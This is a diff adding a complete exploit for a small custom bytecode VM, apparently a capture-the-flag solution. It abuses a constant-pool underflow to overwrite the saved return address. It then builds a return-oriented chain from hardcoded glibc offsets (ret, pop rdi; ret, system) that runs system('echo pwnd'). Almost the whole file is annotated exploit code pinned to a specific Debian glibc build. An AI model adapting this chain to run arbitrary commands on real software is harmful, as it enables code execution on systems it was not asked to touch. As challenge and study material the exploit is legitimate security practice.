@@ -1,0 +1,68 @@
+// REQUIREMENTS:
+// - Debian GLIBC 2.42-13 Compiled by GNU CC version 15.2.0.
+//   * sha256 60e497ccae98697a7aa6299c2c1cc4c248a6fb901341d1a2ac0da6f7485e2f27
+
+// Minified:
+// .data: .int -1 784 .int 0 0x29f75 .int 1 0x2a9b7 .int 2 0x54790 .string 127 "echo pwnd" .code: SWAP 1 PUSHP 0 0 SWAP 1 SUB DUP PUSHP 0 1 ADD DUP PUSH 1 ADD SWAP 3 DUP DUP SWAP 4 PUSHP 0 2 ADD DUP SWAP 19 SWAP 1 DUP SWAP 21 SWAP 3 END
+
+// struct VM layout:
+// - int stack[256]
+// - int sp
+// - int (padding)
+// - const_t pool[128] * 4 ints per const_t:
+//   - int location
+//   - int type (0 for char*, 1 for int)
+//   - char* (low)  Svalue or int Ivalue
+//   - char* (high) Svalue or 0
+// - int codeSize
+// - int (padding)
+// = 772 ints worth in the whole VM struct
+// return address is at sp=783-784
+
+.data:
+    .int -1 784 // pool underflow; set sp offset to 784 (high 32-bits of return address)
+    .int 0 0x29f75 // libc return address after main
+    .int 1 0x2a9b7 // : pop rdi ; ret
+    .int 2 0x54790 // system()
+    .string 127 "echo pwnd" // command
+    
+.code:
+    // goal: stack should look something like this, but with libc offsets
+    // 783: libc low + 0x0002a9b7 = ret, for stack alignment
+    // 784: libc high
+    // 785: libc low + 0x0002a9b7 = pop rdi ; ret
+    // 786: libc high
+    // 787: command low
+    // 788: command high
+    // 789: libc low + 0x00054790 = system()
+    // 790: libc high
+
+    // currently, we are at the high 32-bits of the return address
+    // let a = <return address low>
+    // let b = <return address high>
+    // stack == [a b]
+
+                // ab
+    SWAP 1      // ba
+    PUSHP 0 0   // ba0
+    SWAP 1      // b0a
+    SUB         // b0
+    DUP         // b00
+    PUSHP 0 1   // b002
+    ADD         // b02
+    DUP         // b022
+    PUSH 1      // b0221
+    ADD         // b021
+    SWAP 3      // 102b
+    DUP         // 102bb
+    DUP         // 102bbb
+    SWAP 4      // 1b2bb0
+    PUSHP 0 2   // 1b2bb03
+    ADD         // 1b2bb3
+    DUP SWAP 19 // 1b2bb3y
+    SWAP 1      // 1b2bby3
+    DUP SWAP 21 // 1b2bby3x
+    SWAP 3      // 1b2bxy3b
+                //  1b     2b             xy             3b
+                // [ret], [pop rdi;ret], ["echo pwnd"], [system]
+    END         // system("echo pwnd")
